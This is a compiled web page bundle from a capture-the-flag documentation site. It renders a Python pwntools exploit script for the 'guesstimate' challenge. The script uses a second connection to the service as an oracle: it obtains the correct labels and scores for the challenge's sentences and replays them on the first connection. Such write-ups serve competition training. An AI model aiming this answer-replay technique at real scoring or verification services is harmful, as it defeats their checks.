"use strict";(self.webpackChunkictf_docs=self.webpackChunkictf_docs||[]).push([[4174],{9366:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>u,contentTitle:()=>o,default:()=>l,frontMatter:()=>i,metadata:()=>c,toc:()=>p});var t=r(4848),s=r(8453);const i={},o=void 0,c={id:"writeups/guesstimate/exploit.py",title:"exploit.py",description:"",source:"@site/docs/writeups/guesstimate/exploit.py.md",sourceDirName:"writeups/guesstimate",slug:"/writeups/guesstimate/exploit.py",permalink:"/ictf-docs/writeups/guesstimate/exploit.py",draft:!1,unlisted:!1,editUrl:"https://github.com/ucsb-seclab/ictf-docs/tree/main/docs/writeups/guesstimate/exploit.py.md",tags:[],version:"current",frontMatter:{},sidebar:"writeups",previous:{title:"guesstimate",permalink:"/ictf-docs/writeups/guesstimate/"},next:{title:"IslandParty",permalink:"/ictf-docs/writeups/island-party/"}},u={},p=[];function a(n){const e={code:"code",pre:"pre",...(0,s.R)(),...n.components};return(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import pwn\r\nimport sys\r\nimport re\r\nimport pprint\r\nimport json\r\n\r\npwn.context.log_level = 'debug'\r\nlines = []\r\n\r\ndef get_answers(lines, conn):\r\n    print(\"Retrieving the scores for the sentences:\")\r\n    pprint.pprint(lines)\r\n    \r\n    for i in range(5):\r\n        conn.recvuntil(bytes(f\"Sentence {i + 1}:\", 'utf-8'))\r\n        conn.sendline(lines[i])\r\n\r\n    conn.recvuntil(bytes(f\"The assessment of your sentences is:\", 'utf-8'))\r\n    # Get the results\r\n    buffer = b''\r\n    end_marker = 'Now it is your turn.'\r\n    while True:\r\n        data = conn.recv(512)\r\n        buffer += data\r\n        if end_marker in data.decode():\r\n            break\r\n    \r\n    # Data up to the end_marker\r\n    end_index = buffer.find(end_marker.encode())\r\n    buffer = buffer[:end_index].strip()\r\n\r\n    print(\"Received the following results:\")\r\n    pprint.pprint(buffer)\r\n    conn.close()\r\n    answers = json.loads(buffer)\r\n    return answers\r\n\r\nconn1 = pwn.remote(sys.argv[1], sys.argv[2])\r\nconn2 = pwn.remote(sys.argv[1], sys.argv[2])\r\n\r\n# Send 5 random sentences\r\nfor i in range(5):\r\n    conn1.recvuntil(bytes(f\"Sentence {i + 1}:\", 'utf-8'))\r\n    conn1.sendline(b\"I am happy to see you\")\r\n\r\n# Get the results\r\n#for i in range(5):\r\n#    conn1.recvuntil(bytes(f\"Sentence {i + 1} assessment:\", 'utf-8'))\r\n# lines[i] = conn1.recvline().strip()[len('Sentence X: '):]\r\n\r\nfor i in range(5):\r\n    conn1.recvuntil(bytes(f\"Sentence {i + 1} test:\", 'utf-8'))\r\n    lines.append(conn1.recvline().strip())\r\n\r\nprint(\"Received the following challenge lines:\")\r\npprint.pprint(lines)\r\n\r\nanswers = get_answers(lines, conn2)\r\n\r\nfor i in range(5):\r\n    conn1.recvuntil(bytes(f\"Enter Sentence {i + 1}'s label:\", 'utf-8'))\r\n    conn1.sendline(bytes(answers[i]['label'], 'utf-8'))\r\n    conn1.recvuntil(bytes(f\"Enter Sentence {i + 1}'s score:\", 'utf-8'))\r\n    conn1.sendline(bytes(str(answers[i]['score']), 'utf-8'))\r\n\r\ncomplete_output = \"\"\r\nwhile True:\r\n    try:\r\n        output = str(conn1.recv())\r\n    except:\r\n        break\r\n    if not output:\r\n        break\r\n    complete_output += output\r\n    \r\nprint(complete_output)  \n"})})}function l(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(a,{...n})}):a(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>c});var t=r(6540);const s={},i=t.createContext(s);function o(n){const e=t.useContext(i);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:o(n.components),t.createElement(i.Provider,{value:e},n.children)}}}]);